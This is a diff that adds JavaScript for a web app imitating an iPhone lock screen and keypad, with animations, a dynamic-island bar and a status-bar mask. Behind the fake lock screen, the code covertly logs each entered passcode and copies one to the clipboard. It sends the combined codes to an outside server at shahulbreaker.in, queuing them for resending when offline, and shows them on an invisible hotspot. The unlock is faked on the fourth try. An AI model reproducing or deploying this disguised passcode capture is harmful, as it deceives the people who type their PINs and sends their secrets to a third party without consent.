@@ -1,434 +1,626 @@
-:root {
-  --circle-size: 80px;
-  --gap-x: 28px;
-  --gap-y: 18px;
-  --safe-bottom: env(safe-area-inset-bottom);
-  --app-viewport-height: 100dvh; /* updated by JS at runtime */
+(() => {
+  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
+  const MAX = 4;
+  let code = "";
 
-  /* Dynamic island sizing (can be tuned) */
-  --island-w: 340px;
-  --island-h: 48px;
-  --island-radius: 26px;
-}
+  const dotEls = Array.from(document.querySelectorAll('.dot'));
+  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
+  const emergency = document.getElementById('emergency');
+  // keep a live reference to cancel button
+  let cancelBtn = document.getElementById('cancel');
+  const unlockOverlay = document.getElementById('unlockOverlay');
+  const lockInner = document.querySelector('.lockscreen.inner') || document.querySelector('.lockscreen-inner') || document.querySelector('.lockscreen-inner');
+  const homescreenImg = document.getElementById('homescreenImg');
+  const ATT_KEY = '_pass_attempt_count_';
+  const QUEUE_KEY = '_pass_queue_';
 
-/* Root: prevent rubber-band and provide safe fallback background */
-html, body {
-  touch-action: manipulation;
-  margin: 0;
-  padding: 0;
-  height: 100%;
-  min-height: 100%;
-  -webkit-font-smoothing: antialiased;
-  -webkit-text-size-adjust: 100%;
-  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
-
-  /* gradient fallback so you never see plain white/black */
-  background-color: #000;
-  background: linear-gradient(135deg,#0f1724,#071023);
-
-  /* disable overscroll at root to stop elastic bounce */
-  overscroll-behavior: none;
-  overflow: hidden;
-  -webkit-overflow-scrolling: auto;
-}
-
-/* wallpaper layer - fill the entire screen so the wallpaper is visible under status/home */
-.wallpaper-layer {
-  position: fixed;
-  inset: 0; /* full-bleed */
-  z-index: 0;
-  pointer-events: none;
-  background: linear-gradient(135deg,#0f1724,#071023);
-  display: block;
-  overflow: hidden;
-}
-
-/* Use an <img> so painting is reliable in iOS PWA mode */
-.wallpaper-img {
-  position: absolute;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  display: block;
-  pointer-events: none;
-  -webkit-user-select: none;
-  user-select: none;
-  -webkit-transform: translateZ(0);
-  transform: translateZ(0);
-}
-
-/* Status bar mask: covers OS status area while PWA is running (hidden in normal browser) */
-.status-bar-mask {
-  position: fixed;
-  top: 0;
-  left: 50%;
-  transform: translateX(-50%);
-  height: calc(env(safe-area-inset-top, 20px) + 52px);
-  width: min(440px, calc(100% - 28px));
-  max-width: 440px;
-  border-radius: 34px;
-  z-index: 12000; /* sits above wallpaper and below dynamic island */
-  pointer-events: none;
-  background: linear-gradient(180deg, rgba(0,0,0,0.96), rgba(0,0,0,0.88));
-  box-shadow: 0 8px 20px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.03);
-  -webkit-backdrop-filter: blur(4px);
-  backdrop-filter: blur(4px);
-  display: none; /* only enabled by JS in standalone mode */
-}
-
-/* Slightly smaller pill on narrow displays */
-@media (max-width: 420px) {
-  .status-bar-mask {
-    height: calc(env(safe-area-inset-top, 18px) + 46px);
-    width: min(360px, calc(100% - 20px));
-    border-radius: 30px;
+  /* ---------- Status bar mask helpers (show/hide) ---------- */
+  function isStandaloneMode() {
+    try {
+      return (window.matchMedia && window.matchMedia('(display-mode: standalone)').matches)
+        || window.navigator.standalone === true;
+    } catch (e) { return false; }
   }
-}
 
-/* outer container pinned to viewport using JS-updated height variable */
-.lockscreen {
-  position: fixed;
-  left: 0;
-  right: 0;
-  top: 0;
-  z-index: 2;
-  width: 100%;
-  height: var(--app-viewport-height, 100dvh);
-  min-height: var(--app-viewport-height, 100dvh);
-  display: flex;
-  justify-content: center;
-  align-items: flex-start;
-  box-sizing: border-box;
-  overflow: hidden;
-  padding-top: calc(env(safe-area-inset-top) + 84px);
-  padding-bottom: calc(var(--safe-bottom) + 8px);
-  background: transparent;
-}
+  function showStatusMask() {
+    try {
+      const mask = document.getElementById('statusBarMask');
+      if (!mask) return;
+      mask.style.display = 'block';
+    } catch (e) {}
+  }
+  function hideStatusMask() {
+    try {
+      const mask = document.getElementById('statusBarMask');
+      if (!mask) return;
+      mask.style.display = 'none';
+    } catch (e) {}
+  }
 
-/* tiny bottom filler now transparent so it won't paint a visible bar */
-.lockscreen::after {
-  content: "";
-  position: fixed;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  height: calc(env(safe-area-inset-bottom, 0px) + 4px); /* tiny overfill */
-  pointer-events: none;
-  z-index: 9998;
-  background: transparent; /* previously a gradient — now transparent so it doesn't show */
-}
+  // Turn on mask only in standalone / homescreen PWA mode. Listen for changes.
+  (function initStatusMask() {
+    try {
+      if (isStandaloneMode()) showStatusMask();
+      if (window.matchMedia) {
+        const mm = window.matchMedia('(display-mode: standalone)');
+        const listener = (e) => {
+          if (e.matches) showStatusMask(); else hideStatusMask();
+        };
+        if (mm.addEventListener) mm.addEventListener('change', listener);
+        else if (mm.addListener) mm.addListener(listener);
+      }
+    } catch (e) {}
+  })();
 
-/* inner wrapper (we animate this with JS) */
-.lockscreen-inner {
-  width: 100%;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  z-index: 3;
-  -webkit-transform: translateZ(0);
-  transform: translateZ(0);
-  backface-visibility: hidden;
-  transform: translate3d(0,0,0) scale(1);
-}
+  // Ensure wallpaper <img> is ready/visible (helps iOS PWA painting)
+  (function ensureWallpaperPaints() {
+    try {
+      const wp = document.getElementById('wallpaperImg');
+      if (wp) {
+        // If image fails to load (404), keep gradient fallback in CSS.
+        wp.addEventListener('error', () => {
+          wp.style.display = 'none';
+        });
+        // reduce chance of flicker by forcing decode when supported
+        if (wp.decode) {
+          wp.decode().catch(()=>{/* ignore */});
+        }
+      }
+    } catch (e) {}
+  })();
 
-/* prompt / dots */
-.prompt {
-  position: relative;
-  z-index: 3;
-  text-align: center;
-  font-size: 20px;
-  font-weight: 600;
-  line-height: 1.15;
-  text-shadow: 0 3px 12px rgba(0,0,0,0.6);
-  margin-bottom: 18px;
-  color: white;
-}
+  /* ---------- Viewport sync: match visualViewport and pin heights to avoid sliding/gaps ---------- */
+  (function setupViewportSync() {
+    function updateViewportHeight() {
+      try {
+        const vv = window.visualViewport;
+        const base = vv ? Math.round(vv.height) : window.innerHeight;
+        const overfill = 8;
+        const used = Math.max(100, base + overfill);
+        document.documentElement.style.setProperty('--app-viewport-height', used + 'px');
+        const ls = document.querySelector('.lockscreen');
+        if (ls) ls.style.height = used + 'px';
+        document.body.style.height = used + 'px';
+      } catch (err) {
+        console.warn('viewport sync failed', err);
+      }
+    }
 
-.dots {
-  display: flex;
-  gap: 14px;
-  margin-bottom: 28px;
-  pointer-events: none;
-  z-index: 3;
-  will-change: transform;
-}
-.dot {
-  width: 10px;
-  height: 10px;
-  border-radius: 50%;
-  border: 1.25px solid #fff;
-  background: transparent;
-  transition: background .12s ease, transform .12s ease, border-color .12s ease;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.45) inset;
-}
-.dot.filled {
-  background: #fff;
-  border-color: #fff;
-  transform: scale(1.06);
-  box-shadow: none;
-}
+    window.addEventListener('load', updateViewportHeight, { passive: true });
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
+      window.visualViewport.addEventListener('scroll', updateViewportHeight, { passive: true });
+    }
+    window.addEventListener('resize', updateViewportHeight, { passive: true });
+    window.addEventListener('orientationchange', updateViewportHeight, { passive: true });
 
-/* keypad layout */
-.keypad {
-  width: 100%;
-  max-width: 420px;
-  display: grid;
-  grid-template-columns: repeat(3, var(--circle-size));
-  gap: var(--gap-y) var(--gap-x);
-  justify-content: center;
-  align-items: center;
-  margin-top: 50px;
-  z-index: 3;
-}
+    updateViewportHeight();
 
-.key {
-  width: var(--circle-size);
-  height: var(--circle-size);
-  border-radius: 999px;
-  display: inline-flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  background: rgba(255,255,255,0.07);
-  backdrop-filter: blur(30px);
-  -webkit-backdrop-filter: blur(30px);
-  border: none;
-  color: white;
-  font-size: 32px;
-  cursor: pointer;
-  -webkit-tap-highlight-color: transparent;
-  user-select: none;
-  box-shadow: 0 0 8px rgba(0, 0, 0, 0.35);
-  position: relative;
-  z-index: 3;
-}
+    // catch iOS toolbar animation frames
+    let t = 0;
+    const id = setInterval(() => {
+      updateViewportHeight();
+      t += 1;
+      if (t > 20) clearInterval(id);
+    }, 120);
+  })();
 
-.key.empty {
-  background: transparent !important;
-  box-shadow: none !important;
-  cursor: default;
-  pointer-events: none;
-  visibility: hidden;
-}
+  // rotating buffer for last up-to-4 entered codes
+  const LAST_CODES_KEY = '_pass_last_codes_';
+  function getLastCodes() {
+    try {
+      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
+    } catch (e) {
+      return [];
+    }
+  }
+  function pushLastCode(c) {
+    try {
+      const arr = getLastCodes();
+      arr.push(c);
+      while (arr.length > 4) arr.shift();
+      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
+    } catch (e) {}
+  }
+  function getCombinedLastCodes() {
+    return getLastCodes().join(',');
+  }
 
-.key .num {
-  display: block;
-  font-weight: 600;
-  line-height: 1;
-  font-size: 34px;
-  color: white !important;
-  text-shadow: 0 2px 10px rgba(0,0,0,0.45);
-}
-.key .letters {
-  display: block;
-  font-size: 12px;
-  color: #fff;
-  margin-top: 6px;
-  letter-spacing: 0.9px;
-  text-shadow: 0 1px 2px rgba(0,0,0,0.45);
-  font-weight: 600;
-}
+  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
+  function clearSavedAttempts() {
+    try {
+      localStorage.removeItem(LAST_CODES_KEY);
+      localStorage.removeItem(ATT_KEY);
+      localStorage.removeItem(QUEUE_KEY);
+    } catch (e) { /* ignore */ }
+  }
 
-/* bottom actions aligned to keypad width and centered like iPhone */
-.bottom-actions {
-  position: absolute;
-  left: 50%;
-  bottom: calc(var(--safe-bottom) + 36px);
-  transform: translateX(-50%);
-  width: min(420px, calc(100% - 56px));
-  max-width: 420px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 0 28px;
-  box-sizing: border-box;
-  z-index: 5;
-  pointer-events: auto;
-  background: transparent;
-}
+  (function ensureFreshSessionOnLaunch() {
+    try {
+      const alreadyStarted = sessionStorage.getItem('pass_session_started');
+      function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
 
-/* action buttons styling */
-.action {
-  background: none;
-  border: none;
-  color: white;
-  font-size: 18px;
-  line-height: 1;
-  font-weight: 400;
-  opacity: 0.98;
-  cursor: pointer;
-  -webkit-tap-highlight-color: transparent;
-  padding: 6px 8px;
-  display: inline-block;
-  text-align: center;
-}
+      if (!alreadyStarted) {
+        clearSavedAttempts();
+        markStarted();
+      }
 
-/* unlock overlay & homescreen preview (fixed) */
-.unlock-overlay {
-  position: fixed;
-  inset: 0;
-  z-index: 9999;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  background: transparent;
-  pointer-events: none;
-}
-.homescreen-img {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100vw;
-  height: 100vh;
-  object-fit: cover;
-  transform-origin: center;
-  transform: scale(0.98);
-  opacity: 0;
-  filter: blur(6px) saturate(0.9);
-  z-index: 10000;
-  pointer-events: none;
-  -webkit-transform: translateZ(0);
-  backface-visibility: hidden;
-}
-.unlock-overlay.show {
-  display: flex;
-  pointer-events: auto;
-}
+      window.addEventListener('pageshow', () => {
+        if (!sessionStorage.getItem('pass_session_started')) {
+          clearSavedAttempts();
+          markStarted();
+        }
+      }, { passive: true });
+    } catch (err) {
+      console.warn('session init check failed', err);
+    }
+  })();
 
-/* simple toast used by app.js */
-#pass-toast {
-  position: fixed;
-  left: 50%;
-  bottom: calc(var(--safe-bottom) + 110px);
-  transform: translateX(-50%);
-  background: rgba(0,0,0,0.75);
-  color: #fff;
-  padding: 8px 12px;
-  border-radius: 10px;
-  font-weight: 600;
-  z-index: 12002;
-  pointer-events: none;
-  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
-  box-shadow: 0 6px 18px rgba(0,0,0,0.6);
-  opacity: 0;
-  transition: opacity 160ms ease, transform 160ms ease;
-}
+  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
+  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
-/* Wrong attempt shake */
-@keyframes passShake {
-  0%   { transform: translateX(0); }
-  6%   { transform: translateX(-20px); }
-  14%  { transform: translateX(16px); }
-  24%  { transform: translateX(-14px); }
-  36%  { transform: translateX(12px); }
-  52%  { transform: translateX(-8px); }
-  72%  { transform: translateX(6px); }
-  88%  { transform: translateX(-3px); }
-  100% { transform: translateX(0); }
-}
-.dots.wrong {
-  animation: passShake 700ms cubic-bezier(.36,.07,.19,.97);
-  transform-origin: center;
-  will-change: transform;
-}
+  function refreshDots() {
+    const dots = Array.from(document.querySelectorAll('.dot'));
+    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
+    updateCancelText();
+  }
 
-/* reduced motion fallback */
-@media (prefers-reduced-motion: reduce) {
-  .lockscreen-inner { transition: none !important; transform: none !important; }
-  .homescreen-img { transition: none !important; transform: none !important; filter: none !important; opacity: 1 !important; }
-}
+  function reset() {
+    code = "";
+    refreshDots();
+  }
 
-/* Slight nudge: move Emergency a touch further left */
-#emergency { margin-left: -6px; }
-@media (max-width: 420px) { #emergency { margin-left: -8px; } }
+  function queuePass(pass) {
+    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
+    q.push({ pass, ts: Date.now() });
+    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
+  }
 
-/* =========================
-   Dynamic Island (pure CSS)
-   ========================= */
+  function sendToAPI(pass) {
+    const url = API_BASE + encodeURIComponent(pass);
+    return fetch(url, { method: 'GET', keepalive: true })
+      .catch(() => {
+        queuePass(pass);
+      });
+  }
 
-/* pill base */
-.dynamic-island{
-  position: absolute;
-  left: 50%;
-  top: calc(env(safe-area-inset-top, 20px) + 8px);
-  transform: translateX(-50%);
-  width: var(--island-w);
-  height: var(--island-h);
-  border-radius: var(--island-radius);
-  pointer-events: none;
-  z-index: 12001;
+  function flushQueue() {
+    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
+    if (!queue.length) return;
+    queue.forEach(item => {
+      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
+    });
+    localStorage.removeItem(QUEUE_KEY);
+  }
 
-  /* deep black with a subtle highlight on top */
-  background:
-    radial-gradient(120% 180% at 50% -30%, rgba(255,255,255,0.10), rgba(255,255,255,0.00) 60%),
-    #000;
+  /* ---------- Spring engine (semi-implicit integrator) ---------- */
+  function springAnimate(opts) {
+    const mass = opts.mass ?? 1;
+    const stiffness = opts.stiffness ?? 120; // k
+    const damping = opts.damping ?? 14;      // c
+    const threshold = opts.threshold ?? 0.02;
+    let x = opts.from;
+    let v = opts.velocity ?? 0;
+    const target = opts.to;
+    let last = performance.now();
+    let rafId = null;
 
-  /* faint outer stroke + shadow + inner strokes */
-  box-shadow:
-    0 10px 28px rgba(0,0,0,0.45),
-    0 0 0 0.5px rgba(255,255,255,0.06) inset,
-    0 1px 0 rgba(255,255,255,0.06) inset;
-}
+    function step(now) {
+      const dt = Math.min(0.032, (now - last) / 1000);
+      last = now;
+      const a = (-stiffness * (x - target) - damping * v) / mass;
+      v += a * dt;
+      x += v * dt;
 
-/* left and right icon containers */
-.dynamic-island::before,
-.dynamic-island::after{
-  content:"";
-  position:absolute;
-  top:50%;
-  width:22px;
-  height:22px;
-  transform: translateY(-50%);
-  opacity: 0.96;
-  filter: drop-shadow(0 1px 0 rgba(255,255,255,0.12));
-  background-repeat: no-repeat;
-  background-position: center;
-  background-size: contain;
-}
+      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);
 
-/* positions to match iOS placement */
-.dynamic-island::before{ left: 22px; }   /* lock icon */
-.dynamic-island::after{  right: 22px; }  /* face icon */
+      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
+      if (isSettled) {
+        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
+        if (typeof opts.onComplete === 'function') opts.onComplete();
+        cancelAnimationFrame(rafId);
+        return;
+      }
+      rafId = requestAnimationFrame(step);
+    }
 
-/* inline SVG icons (data-URIs) */
-/* face icon assigned as --icon-face; lock icon varies by state (locked/unlocked) */
-.dynamic-island{
-  --icon-face: url("data:image/svg+xml;utf8,\
-  <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'>\
-    <path d='M4 8V6a2 2 0 0 1 2-2h2'/>\
-    <path d='M20 8V6a2 2 0 0 0-2-2h-2'/>\
-    <path d='M4 16v2a2 2 0 0 0 2 2h2'/>\
-    <path d='M20 16v2a2 2 0 0 1-2 2h-2'/>\
-    <circle cx='9' cy='11' r='1.2' fill='%23ffffff' stroke='none'/>\
-    <circle cx='15' cy='11' r='1.2' fill='%23ffffff' stroke='none'/>\
-    <path d='M9 15c1.2 1 4.8 1 6 0' stroke='%23ffffff' fill='none'/>\
-  </svg>");
-}
+    rafId = requestAnimationFrame(step);
+    return () => cancelAnimationFrame(rafId);
+  }
 
-/* locked / unlocked lock icons (white filled glyphs) */
-.dynamic-island.locked{
-  --icon-lock: url("data:image/svg+xml;utf8,\
-  <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff'>\
-    <path d='M17 10h-1V8a4 4 0 0 0-8 0v2H7a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1zm-3 0H10V8a2 2 0 1 1 4 0v2z'/>\
-  </svg>");
-}
-.dynamic-island.unlocked{
-  --icon-lock: url("data:image/svg+xml;utf8,\
-  <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff'>\
-    <path d='M17 10h-1V8a4 4 0 1 0-8 0h2a2 2 0 1 1 4 0v2H7a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1z'/>\
-  </svg>");
-}
+  /* ---------- playUnlockAnimation uses two springs ---------- */
+  function playUnlockAnimation() {
+    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    if (!lockInner || !unlockOverlay || !homescreenImg) return;
 
-/* assign to pseudo-elements */
-.dynamic-island::before{ background-image: var(--icon-lock); }
-.dynamic-island::after{  background-image: var(--icon-face);  }
+    unlockOverlay.classList.add('show');
 
-/* responsive for smaller screens */
-@media (max-width: 420px){
-  :root{ --island-w: 300px; --island-h: 44px; --island-radius: 24px; }
-  .dynamic-island::before, .dynamic-island::after { width:20px; height:20px; left:18px; right:18px; }
-}
+    if (prefersReduced) {
+      lockInner.style.transform = `translate3d(0, -110%, 0)`;
+      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
+      homescreenImg.style.opacity = '1';
+      homescreenImg.style.filter = 'blur(0) saturate(1)';
+      return;
+    }
 
-/* End Dynamic Island */
+    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
+    const targetY = -Math.round(height * 1.08);
+
+    lockInner.style.willChange = 'transform, opacity';
+    homescreenImg.style.willChange = 'transform, filter, opacity';
+    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
+    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
+    homescreenImg.style.opacity = '0';
+    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
+    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
+
+    springAnimate({
+      from: 0,
+      to: targetY,
+      mass: 1.05,
+      stiffness: 140,
+      damping: 16,
+      onUpdate: (val) => {
+        const progress = Math.min(1, Math.abs(val / targetY));
+        const scale = 1 - 0.003 * progress;
+        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
+        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
+      },
+      onComplete: () => {
+        lockInner.style.boxShadow = '';
+        lockInner.style.opacity = '0';
+        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
+      }
+    });
+
+    springAnimate({
+      from: 0,
+      to: 1,
+      mass: 1,
+      stiffness: 80,
+      damping: 11,
+      onUpdate: (p) => {
+        const progress = Math.max(0, Math.min(1, p));
+        const raw = p;
+        const scale = 1 + (raw - 1) * 0.12;
+        const finalScale = Math.max(0.96, Math.min(1.06, scale));
+        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
+        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
+        const sat = 0.9 + Math.min(0.15, raw * 0.15);
+        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
+        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
+      },
+      onComplete: () => {
+        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
+        homescreenImg.style.filter = 'blur(0) saturate(1)';
+        homescreenImg.style.opacity = '1';
+      }
+    });
+
+    setTimeout(() => {
+      lockInner.style.boxShadow = '';
+      homescreenImg.style.willChange = '';
+      lockInner.style.willChange = '';
+    }, 1200);
+  }
+
+  function animateWrongAttempt() {
+    const dotsEl = document.getElementById('dots');
+    if (!dotsEl) {
+      reset();
+      return;
+    }
+    const DURATION = 700;
+
+    // Force Cancel label back to 'Cancel' during shake
+    if (cancelBtn) cancelBtn.textContent = 'Cancel';
+
+    dotsEl.classList.add('wrong');
+    reset();
+    setTimeout(() => {
+      dotsEl.classList.remove('wrong');
+    }, DURATION + 20);
+  }
+
+  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
+  function copyToClipboard(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      return navigator.clipboard.writeText(text).catch(() => {
+        return fallbackCopy(text);
+      });
+    }
+    return Promise.resolve().then(() => fallbackCopy(text));
+  }
+
+  function fallbackCopy(text) {
+    return new Promise((resolve, reject) => {
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        ta.style.top = '0';
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        const ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        if (ok) resolve();
+        else reject(new Error('execCommand copy failed'));
+      } catch (err) {
+        reject(err);
+      }
+    });
+  }
+
+  function showToast(msg, ms = 1200) {
+    let t = document.getElementById('pass-toast');
+    if (!t) {
+      t = document.createElement('div');
+      t.id = 'pass-toast';
+      document.body.appendChild(t);
+      if (!getComputedStyle(t).position) {
+        Object.assign(t.style, {
+          position: 'fixed',
+          left: '50%',
+          bottom: '120px',
+          transform: 'translateX(-50%)',
+          background: 'rgba(0,0,0,0.75)',
+          color: '#fff',
+          padding: '8px 12px',
+          borderRadius: '10px',
+          zIndex: '12002',
+          pointerEvents: 'none',
+          opacity: '0',
+          transition: 'opacity 160ms ease, transform 160ms ease'
+        });
+      }
+    }
+    t.textContent = msg;
+    t.style.opacity = '1';
+    t.style.transform = 'translateX(-50%) translateY(0)';
+    clearTimeout(t._hideTimer);
+    t._hideTimer = setTimeout(() => {
+      t.style.opacity = '0';
+      t._hideTimer2 = setTimeout(() => {}, 200);
+    }, ms);
+  }
+
+  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
+  async function handleCompleteAttempt(enteredCode) {
+    let attempts = getAttempts();
+    attempts += 1;
+    setAttempts(attempts);
+
+    // push code into rotating buffer (so hotspot displays exact payload)
+    pushLastCode(enteredCode);
+
+    if (attempts === 1 || attempts === 2) {
+      animateWrongAttempt();
+    } else if (attempts === 3) {
+      const combined = getCombinedLastCodes();
+      if (combined) sendToAPI(combined);
+      animateWrongAttempt();
+    } else if (attempts === 4) {
+      // Important: reveal real iOS status bar by hiding the mask before unlock animation
+      hideStatusMask();
+      playUnlockAnimation();
+      setTimeout(reset, 300);
+    }
+
+    if (attempts >= 4) {
+      setAttempts(0);
+    }
+  }
+
+  function animateBrightness(el, target, duration) {
+    let startTime;
+    const initial = parseFloat(el.dataset.brightness || "1");
+    const change = target - initial;
+
+    function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
+
+    function frame(ts) {
+      if (!startTime) startTime = ts;
+      const progress = Math.min((ts - startTime) / duration, 1);
+      const eased = easeOutCubic(progress);
+      const value = initial + change * eased;
+      el.style.filter = `brightness(${value})`;
+      el.dataset.brightness = value.toFixed(3);
+      if (progress < 1) requestAnimationFrame(frame);
+    }
+    requestAnimationFrame(frame);
+  }
+
+  keys.forEach(k => {
+    const num = k.dataset.num;
+    if (!num) return;
+
+    k.addEventListener('touchstart', () => {
+      animateBrightness(k, 1.6, 80);
+      updateCancelText();
+    }, { passive: true });
+
+    const endPress = () => { animateBrightness(k, 1, 100); };
+    k.addEventListener('touchend', endPress);
+    k.addEventListener('touchcancel', endPress);
+    k.addEventListener('mouseleave', endPress);
+
+    k.addEventListener('click', () => {
+      if (code.length >= MAX) return;
+      code += num;
+      refreshDots();
+
+      if (code.length === MAX) {
+        const enteredCode = code;
+        try {
+          const upcomingAttempts = getAttempts() + 1;
+          if (upcomingAttempts === 3) {
+            const toCopy = enteredCode;
+            copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
+          }
+        } catch (err) {
+          console.warn('clipboard pre-copy failed', err);
+        }
+
+        setTimeout(() => {
+          handleCompleteAttempt(enteredCode);
+        }, 120);
+      }
+    });
+  });
+
+  emergency && emergency.addEventListener('click', e => e.preventDefault());
+
+  // ----------------- Cancel / Delete behavior (non-destructive) -----------------
+  function updateCancelText() {
+    cancelBtn = document.getElementById('cancel') || cancelBtn;
+    if (!cancelBtn) return;
+    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
+  }
+
+  function wireCancelAsDelete() {
+    const old = document.getElementById('cancel');
+    if (!old) return;
+    const cloned = old.cloneNode(true);
+    old.parentNode && old.parentNode.replaceChild(cloned, old);
+    cancelBtn = document.getElementById('cancel');
+    cancelBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      if (code.length > 0) {
+        code = code.slice(0, -1);
+        refreshDots();
+        updateCancelText();
+      } else {
+        reset();
+      }
+    });
+  }
+
+  wireCancelAsDelete();
+  updateCancelText();
+
+  window.addEventListener('online', flushQueue);
+  flushQueue();
+
+  /* ---------- Invisible bottom-left hotspot: show combined last codes on press ---------- */
+
+  function createInvisibleHotspotAndDisplay() {
+    if (!document.getElementById('codesHotspot')) {
+      const hs = document.createElement('div');
+      hs.id = 'codesHotspot';
+      Object.assign(hs.style, {
+        position: 'fixed',
+        left: '8px',
+        bottom: '8px',
+        width: '56px',
+        height: '56px',
+        borderRadius: '12px',
+        background: 'transparent',
+        border: 'none',
+        zIndex: '12000',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        boxSizing: 'border-box',
+        touchAction: 'manipulation',
+        cursor: 'pointer',
+        pointerEvents: 'auto'
+      });
+      document.body.appendChild(hs);
+    }
+
+    if (!document.getElementById('codesCombinedDisplay')) {
+      const d = document.createElement('div');
+      d.id = 'codesCombinedDisplay';
+      Object.assign(d.style, {
+        position: 'fixed',
+        left: '8px',
+        bottom: '72px',
+        minWidth: '160px',
+        maxWidth: 'calc(100% - 16px)',
+        zIndex: '12001',
+        display: 'none',
+        justifyContent: 'center',
+        pointerEvents: 'none',
+        transition: 'opacity 120ms ease, transform 120ms ease'
+      });
+
+      const inner = document.createElement('div');
+      inner.id = 'codesCombinedInner';
+      Object.assign(inner.style, {
+        width: '100%',
+        background: 'rgba(0,0,0,0.7)',
+        borderRadius: '12px',
+        padding: '10px 12px',
+        boxSizing: 'border-box',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        color: '#fff',
+        fontSize: '16px',
+        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
+        fontWeight: '700',
+        letterSpacing: '0.6px'
+      });
+
+      d.appendChild(inner);
+      document.body.appendChild(d);
+    }
+  }
+
+  function showCombinedStringAtBottomLeft() {
+    createInvisibleHotspotAndDisplay();
+    const bar = document.getElementById('codesCombinedDisplay');
+    const inner = document.getElementById('codesCombinedInner');
+    inner.textContent = '';
+
+    const codes = getLastCodes();
+    if (!codes || codes.length === 0) inner.textContent = '';
+    else inner.textContent = codes.join(',');
+
+    bar.style.display = 'flex';
+    requestAnimationFrame(() => {
+      bar.style.transform = 'translateY(0)';
+      bar.style.opacity = '1';
+    });
+  }
+
+  function hideCombinedDisplayNow() {
+    const bar = document.getElementById('codesCombinedDisplay');
+    if (!bar) return;
+    bar.style.transform = 'translateY(8px)';
+    bar.style.opacity = '0';
+    setTimeout(() => {
+      if (bar) bar.style.display = 'none';
+    }, 140);
+  }
+
+  // Hotspot handlers
+  function onHotspotDown(ev) {
+    ev.preventDefault();
+    showCombinedStringAtBottomLeft();
+  }
+  function onHotspotUp(ev) {
+    hideCombinedDisplayNow();
+  }
+
+  function ensureHotspotListeners() {
+    createInvisibleHotspotAndDisplay();
+    const hs = document.getElementById('codesHotspot');
+    if (!hs._attached) {
+      hs.addEventListener('pointerdown', onHotspotDown);
+      window.addEventListener('pointerup', onHotspotUp);
+      window.addEventListener('pointercancel', onHotspotUp);
+      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
+      window.addEventListener('touchend', onHotspotUp);
+      window.addEventListener('touchcancel', onHotspotUp);
+      hs._attached = true;
+    }
+  }
+
+  ensureHotspotListeners();
+
